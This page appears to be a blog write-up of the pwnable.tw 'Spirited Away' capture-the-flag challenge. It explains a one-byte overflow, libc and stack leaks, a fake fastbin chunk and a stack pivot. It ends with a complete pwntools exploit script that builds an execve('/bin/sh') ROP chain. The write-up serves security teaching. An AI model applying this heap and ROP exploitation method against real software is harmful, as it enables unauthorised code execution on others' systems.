<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - Spirited Away - D3xt3r&#039;s Laboratory</title><meta description="#Challange DescriptionNameSpirited AwayPoints300Libc2.23Solves457 timesCategoryExploitationDescriptionThanks for watching Spirited Away ! Please leave some comments to help us improve our next movie !"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - Spirited Away"><meta property="og:url" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/"><meta property="og:site_name" content="D3xt3r&#039;s Laboratory"><meta property="og:description" content="#Challange DescriptionNameSpirited AwayPoints300Libc2.23Solves457 timesCategoryExploitationDescriptionThanks for watching Spirited Away ! Please leave some comments to help us improve our next movie !"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/checksec.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/application-code.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/libc-leak-stack-layout.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/stack-leak-stack-layout.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/rop-chain.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/flag.png"><meta property="article:published_time" content="2020-07-10T18:30:00.000Z"><meta property="article:modified_time" content="2020-07-28T12:45:56.596Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="Heap Exploitation"><meta property="article:tag" content="WarGames"><meta property="article:tag" content="ROP"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="checksec.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/"},"headline":"D3xt3r's Laboratory","image":["https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/checksec.png","https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/application-code.png","https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/libc-leak-stack-layout.png","https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/stack-leak-stack-layout.png","https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/rop-chain.png","https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/flag.png"],"datePublished":"2020-07-10T18:30:00.000Z","dateModified":"2020-07-28T12:45:56.596Z","author":{"@type":"Person","name":"D3xt3r"},"description":"#Challange DescriptionNameSpirited AwayPoints300Libc2.23Solves457 timesCategoryExploitationDescriptionThanks for watching Spirited Away ! Please leave some comments to help us improve our next movie !"}</script><link rel="alternative" href="/atom.xml" title="D3xt3r&#039;s Laboratory" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="D3xt3r&#039;s Laboratory" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publications</a><a class="navbar-item" href="/cve">CVE</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" datetime="2020-07-10T18:30:00.000Z" title="2020-07-10T18:30:00.000Z">2020-07-11</time><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span><span class="level-item">11 minutes read (About 1678 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - Spirited Away</h1><div class="content"><h2><span id="challange-description">Challange Description</span></h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>Spirited Away</td></tr><tr><td>Points</td><td>300</td></tr><tr><td>Libc</td><td>2.23</td></tr><tr><td>Solves</td><td>457 times</td></tr><tr><td>Category</td><td>Exploitation</td></tr><tr><td>Description</td><td>Thanks for watching Spirited Away ! Please leave some comments to help us improve our next movie !</td></tr></tbody></table><a id="more"></a><h2><span id="binary-protection">Binary Protection</span></h2><p>Let’s look at the binary protection</p><p><img src="checksec.png" alt="checksec"></p><p>The PIE and stack canary is disabled this might make libc leaking easier and since the stack check is disabled challenge might have something to do with stack overflow vulnerability.</p><h2><span id="challenge-binary">Challenge Binary</span></h2><p>Let’s look at the meat of the application code</p><p><img src="application-code.png" alt="Decomplied code"></p><p>The application takes collects review about the movie in an infinite loop and you can input maximum up to 200 reviews and then the application will exit the loop and terminate.</p><h3><span id="challenge-constraints">Challenge Constraints</span></h3><p>A couple of fact about the code which will help in exploiting the challenge:</p><ol><li>The <strong>username buffer</strong> is allocated from the <em>heap</em>(size 60 bytes) and the maximum input size to read from this buffer is stored on the stack(with variable name <strong>name_len</strong> with value 60(bytes).</li><li>The <strong>comment buffer</strong> is on the <em>stack</em>(size 80 bytes) but the buffer size to read from the input is store on the stack which also the same variable <em>name_len</em> which was for the <em>username buffer</em>.</li><li>A the end of the loop body username memory chuck is freed, and the beginning of the loop username is allocated again.</li><li>The <strong>comment buffer</strong> is zero-out at the start of each loop. So I guess it will be a bad place to host a shellcode.</li></ol><h2><span id="vulnerability">Vulnerability</span></h2><p>The vulnerability in the application is on line 36, where it is trying to create an output string of the number of reviews received so far. The buffer size of <em>output_str</em> is 56 character and the template string(&quot;%d comment so far…&quot;) is also 56 bytes. The overflow is not noticeable till we have the number of reviews in 2 digits(since the output_str will also be 56 char). But, when the reviews count is in three digits the <em>output_str</em> array will overflow by one byte and the adjacent variable <strong>name_len</strong> will be overflow with the last <strong>n</strong> character of the template string.</p><p>The <em>name_len</em> variable which used the value of 60 ( discussed in constraints section) has now changed to 0x6e (char ‘n’), which is a bump of 50 bytes. FYI this is the variable decides the max buffer input of <strong>username</strong> of size 60 and <strong>comment</strong> which is size 80. So you can now do out of bounds write to both heap and stack buffer.</p><h2><span id="the-leak">The Leak</span></h2><p>The stack memory created and destroy whenever a function call is made and it returns respectively and, during a function execution it might put a pointer to other function, data on the stack. The stack memory is reused by next executing function and if that function doesn’t overwrite the stack and can read that data it can leak pointer data to what other functions have written. This attack is vaguely called stack-reuse and one function can influence the execution of other function by this method.</p><p>This technique can be used to leak the libc address, when the <em>survey function</em> when it starts executing, it’s stack has <em>fflush function</em> address and if we overwrite just the null-bytes till that address we can leak the libc address as fflush is in the Libc address range.</p><p><img src="libc-leak-stack-layout.png" alt="main function stack during leaking Libc"></p><p>Similarly, if we go more down in the stack memory there is stack address frame address which we can leak, which is shown in the picture below.</p><p><img src="stack-leak-stack-layout.png" alt="Stack layout while doing stack address leak"></p><p>Using the <em>fflush function</em> leaked address we calculate the libc base address by subtracting the offset <em>0x5d39f</em>. The stack address we leak will be used for another attack which I will describe in the coming section.</p><h2><span id="the-write-primitive">The Write Primitive</span></h2><p>At this stage, we have libc base address, stack address and also we can do stack and heap overflow how do we proceed next? This is going to be a little tricky, this exploit needs meticulously data crafting, so read this section attentively. Adjacent to the <em>comment buffer</em> is the variable which stores the pointer to the <em>username</em> memory chunk return from the heap. We can overflow the <em>comment buffer</em> to overwrite the <em>username pointer variable</em>(which stores heap pointer) value with the address of the fake chuck. Later when the free is done on <em>username ptr</em> (line no 59) the fake chunk will end up in fastbin. Next, when we do the malloc the fake chunk will be returned and we can overwrite that addresses data with anything.</p><p>The goal of the fake chunk attack is that we can overwrite the return address of the <em>survey function</em> with the address of the shellcode. So the fake chunk has to be near the end of the stack which will be <strong>ebp-0x50</strong> which is the <em>movie_reason buffer</em>. We also need to ensure that the address of the fake-chunk is set to 0x41 so that malloc doesn’t throw any corruption error.</p><p>Now when the malloc allocated <em>username buffer</em> we can write up to 110 bytes which is sufficient to do return address overwrite.</p><h2><span id="code-execution">Code Execution</span></h2><p>Even though we can overwrite the return address the buffer size is not enough to hold the ROP chain data. To overcome this we can pivot the stack to <em>comment buffer</em> since it is large enough to hold the execve ROP chain.</p><p>So we need to have multi-stage ROP chain in which the first stage ROP chain will pivot the stack to comment buffer and the comment buffer will hold the execve ROP chain.</p><p>Once we have executed the above attack we stop entering more comments and break from the infinite loop which will trigger the ROP and we will get the shell.</p><p><img src="rop-chain.png" alt="ROP chain"></p><h2><span id="exploit-code">Exploit Code</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_bin = <span class="string">'./libc_32.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    io = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10204</span>, timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">'./spirited_away'</span>,</span><br><span class="line">                 env=&#123;<span class="string">'LD_PRELOAD'</span>: libc_bin&#125;, aslr=<span class="literal">True</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get intro</span></span><br><span class="line">io.readuntil(<span class="string">'our next movie! '</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_comment</span><span class="params">(name, reason, comment, age=<span class="number">10</span>, cont=<span class="string">'y'</span>)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">'name: '</span>)</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        io.send(name)</span><br><span class="line">    io.readuntil(<span class="string">'age: '</span>)</span><br><span class="line">    <span class="keyword">if</span> age <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        io.sendline(str(age))</span><br><span class="line">    io.readuntil(<span class="string">'movie? '</span>)</span><br><span class="line">    io.send(reason)</span><br><span class="line">    io.readuntil(<span class="string">'comment: '</span>)</span><br><span class="line">    <span class="keyword">if</span> comment <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        io.send(comment)</span><br><span class="line">    comm_info = io.readuntil(<span class="string">'comment? &lt;y/n&gt;: '</span>)</span><br><span class="line">    io.send(cont)</span><br><span class="line">    <span class="keyword">return</span> comm_info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    res = add_comment(<span class="string">'AAAA'</span>, <span class="string">'B'</span>*<span class="number">36</span>, <span class="string">'CCCC'</span>)</span><br><span class="line"></span><br><span class="line">    fflush_addr = u32(res[<span class="number">63</span>:<span class="number">63</span>+<span class="number">4</span>])</span><br><span class="line">    log.info(<span class="string">'fflush addr : '</span> + hex(fflush_addr))</span><br><span class="line">    ff_offset = <span class="number">0x5d39f</span></span><br><span class="line">    libc_base = fflush_addr - ff_offset</span><br><span class="line">    log.info(<span class="string">'Libc Base : '</span> + hex(libc_base))</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">    res = add_comment(<span class="string">'AAAA'</span>, <span class="string">'B'</span>*<span class="number">80</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">    frame_base = u32(res[<span class="number">107</span>:<span class="number">107</span>+<span class="number">4</span>])</span><br><span class="line">    log.info(<span class="string">'Prev EBP : '</span> + hex(frame_base))</span><br><span class="line">    log.info(<span class="string">'Curr EBP : '</span> + hex(frame_base - <span class="number">0x20</span>))</span><br><span class="line">    <span class="keyword">return</span> frame_base - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drain_count</span><span class="params">(till_count, name=<span class="string">'AAAA'</span>, comment=<span class="string">'CCCC'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        res = add_comment(name=name, reason=<span class="string">'BBBB'</span>, comment=comment)</span><br><span class="line">        <span class="keyword">if</span> len(res) &gt; <span class="number">0</span>:</span><br><span class="line">            cnt_idx = res.find(<span class="string">b'comment so far'</span>)</span><br><span class="line">            <span class="keyword">if</span> cnt_idx &gt; <span class="number">0</span>:</span><br><span class="line">                res_cnt = res[cnt_idx<span class="number">-4</span>:cnt_idx+<span class="number">14</span>].decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                res_cnt = res_cnt.replace(<span class="string">'comment so far'</span>, <span class="string">''</span>).strip()</span><br><span class="line">                log.info(<span class="string">'Reviews Count : '</span> + res_cnt)</span><br><span class="line">                cnt_val = int(res_cnt)</span><br><span class="line">                <span class="keyword">if</span> cnt_val &gt;= till_count:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                log.info(<span class="string">'Invalid idx'</span>)</span><br><span class="line">                print(res)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.info(<span class="string">'Invalid Response'</span>)</span><br><span class="line">            print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------ EXPLOIT --------------------</span></span><br><span class="line"></span><br><span class="line">libc_base = leak_libc()</span><br><span class="line">prev_frame_base = leak_stack()</span><br><span class="line"></span><br><span class="line">drain_count(<span class="number">10</span>)</span><br><span class="line">drain_count(<span class="number">102</span>, name=<span class="literal">None</span>, comment=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rebase</span><span class="params">(x)</span>:</span> <span class="keyword">return</span> p32(x + libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_two</span><span class="params">(frame_base)</span>:</span></span><br><span class="line">    log.info(<span class="string">'initaiting attack'</span>)</span><br><span class="line">    comment_offset = <span class="number">0xa8</span></span><br><span class="line">    reason_offset = <span class="number">0x50</span></span><br><span class="line">    comment_payload = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + p32(<span class="number">0x41</span>) * (int((<span class="number">80</span> - <span class="number">4</span>) / <span class="number">4</span>))</span><br><span class="line">    comment_payload += p32(frame_base - reason_offset + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    reason_payload = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + p32(<span class="number">0x41</span>) * (int((<span class="number">80</span> - <span class="number">16</span>) / <span class="number">4</span>))</span><br><span class="line">    res = add_comment(name=<span class="string">'AAAA'</span>,</span><br><span class="line">                      reason=reason_payload,</span><br><span class="line">                      comment=comment_payload,</span><br><span class="line">                      age=<span class="literal">None</span>)</span><br><span class="line">    print(res)</span><br><span class="line">    log.info(<span class="string">'Overflow is likely achived'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_exploit</span><span class="params">(libc_base, frame_base)</span>:</span></span><br><span class="line">    <span class="comment"># 0xffffddd0</span></span><br><span class="line">    comment_offset = <span class="number">0xa8</span></span><br><span class="line">    stage1_rop = p8(<span class="number">0x41</span>) * <span class="number">0x48</span> + p32(frame_base)</span><br><span class="line">    stage1_rop += rebase(<span class="number">0x00023f97</span>)  <span class="comment"># 0x00023f97: pop eax; ret;</span></span><br><span class="line">    stage1_rop += p32(frame_base - comment_offset)</span><br><span class="line">    stage1_rop += rebase(<span class="number">0x001748f8</span>)  <span class="comment"># 0x001748f8: xchg eax, esp; ret 0;</span></span><br><span class="line">    stage2_rop = get_rop(libc_base)</span><br><span class="line"></span><br><span class="line">    res = add_comment(name=stage1_rop,</span><br><span class="line">                      reason=<span class="string">'AAA'</span>,</span><br><span class="line">                      comment=stage2_rop,</span><br><span class="line">                      age=<span class="literal">None</span>,</span><br><span class="line">                      cont=<span class="string">'n'</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rop</span><span class="params">(libc_base_addr)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    ROP chain was build using ropper function,</span></span><br><span class="line"><span class="string">    and this code is generated with ropper tool.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    rop = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">    rop += rebase(<span class="number">0x00023f97</span>)  <span class="comment"># 0x00023f97: pop eax; ret;</span></span><br><span class="line">    rop += <span class="string">b'//bi'</span></span><br><span class="line">    rop += rebase(<span class="number">0x00001aa6</span>)  <span class="comment"># 0x00001aa6: pop edx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0040</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x0006b34b</span>)  <span class="comment"># 0x0006b34b: mov dword ptr [edx], eax; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x00023f97</span>)  <span class="comment"># 0x00023f97: pop eax; ret;</span></span><br><span class="line">    rop += <span class="string">b'n/sh'</span></span><br><span class="line">    rop += rebase(<span class="number">0x00001aa6</span>)  <span class="comment"># 0x00001aa6: pop edx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0044</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x0006b34b</span>)  <span class="comment"># 0x0006b34b: mov dword ptr [edx], eax; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x00023f97</span>)  <span class="comment"># 0x00023f97: pop eax; ret;</span></span><br><span class="line">    rop += p32(<span class="number">0x00000000</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x00001aa6</span>)  <span class="comment"># 0x00001aa6: pop edx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0048</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x0006b34b</span>)  <span class="comment"># 0x0006b34b: mov dword ptr [edx], eax; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x000850f9</span>)  <span class="comment"># 0x000850f9: pop ebx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0040</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x000b3eb7</span>)  <span class="comment"># 0x000b3eb7: pop ecx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0048</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x00001aa6</span>)  <span class="comment"># 0x00001aa6: pop edx; ret;</span></span><br><span class="line">    rop += rebase(<span class="number">0x001b0048</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x00023f97</span>)  <span class="comment"># 0x00023f97: pop eax; ret;</span></span><br><span class="line">    rop += p32(<span class="number">0x0000000b</span>)</span><br><span class="line">    rop += rebase(<span class="number">0x00002c87</span>)  <span class="comment"># 0x00002c87: int 0x80;</span></span><br><span class="line">    log.info(<span class="string">'Payload len '</span> + str(len(rop)))</span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">stage_two(prev_frame_base)</span><br><span class="line">stage_exploit(libc_base, prev_frame_base)</span><br></pre></td></tr></table></figure><p><img src="flag.png" alt="Exploit Execution"></p><h2><span id="conclusion">Conclusion</span></h2><p>An interesting one-byte overflow challenge which is then escalated to stack overflow to overwrite the return address. But since it had non-exec stack we have to create ROP but, we again faced and buffer size limitation which couldn’t hold execve ROP. So, we used the stack pivot technique to migrate the ROP chain to another buffer.</p></div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/Heap-Exploitation/">Heap Exploitation</a><a class="link-muted mr-2" rel="tag" href="/tags/WarGames/">WarGames</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/07/12/binary-exploitation-pwnable-tw-caov/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Binary Exploitation [pwnable.tw] - CAOV</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/"><span class="level-item">Binary Exploitation [pwnable.tw] - Realloc</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/",this.page.identifier="2020/07/11/binary-exploitation-pwnable-tw-spirited-away/"};!function(){var t=document,i=t.createElement("script");i.src="//taintedbits.disqus.com/embed.js",i.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(i)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1 is-sticky"><div class="card widget" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex" href="#"><span class="mr-2">1</span><span>Challange Description</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">2</span><span>Binary Protection</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">3</span><span>Challenge Binary</span></a><ul class="menu-list"><li><a class="is-flex" href="#"><span class="mr-2">3.1</span><span>Challenge Constraints</span></a></li></ul></li><li><a class="is-flex" href="#"><span class="mr-2">4</span><span>Vulnerability</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">5</span><span>The Leak</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">6</span><span>The Write Primitive</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">7</span><span>Code Execution</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">8</span><span>Exploit Code</span></a></li><li><a class="is-flex" href="#"><span class="mr-2">9</span><span>Conclusion</span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/18/binary-exploitation-pwnable-tw-hacknote/">Binary Exploitation [pwnable.tw] - HackNote</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" 